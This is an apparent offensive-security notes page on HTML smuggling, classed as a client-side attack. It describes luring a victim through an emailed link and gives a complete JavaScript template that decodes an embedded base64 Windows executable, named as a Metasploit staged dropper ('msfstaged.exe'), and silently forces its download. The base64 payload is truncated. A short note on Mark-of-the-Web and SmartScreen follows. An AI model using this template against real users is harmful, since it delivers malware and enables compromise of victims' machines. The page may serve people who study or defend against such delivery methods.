---
title: HTML Smuggling
category: Client Side Attacks
order: 4
---

It is a discret delivery method of payloads. An attacker can embed a link in an email. When the victim reads the email and visits the webpage, js code will use html smuggling to automatically save the dropper file.

```html
<html>
    <script>
        function base64ToArrayBuffer(base64){ 
            var binary_string = window.atob(base64); 
            var len = binary_string.length; 
            var bytes = new Uint8Array( len ); 
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); } 
            return bytes.buffer; 
        }
        var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
        var data = base64ToArrayBuffer(file); 
        var blob = new Blob([data], {type: 'octet/stream'}); 
        var fileName = 'msfstaged.exe'; 
        var a = document.createElement('a'); 
        document.body.appendChild(a); 
        a.style = 'display: none'; 
        var url = window.URL.createObjectURL(blob); 
        a.href = url; 
        a.download = fileName; 
        a.click(); 
        window.URL.revokeObjectURL(url);
    </script>
</html>
```

It will be executed once the victim enters to the download folder and execute it manually.

>  **Note**: The binary is marked with MoTW cause is downloaded through a brower. This means that Windows will execute the SmartScreen feature to avoid the binary of beeing executed.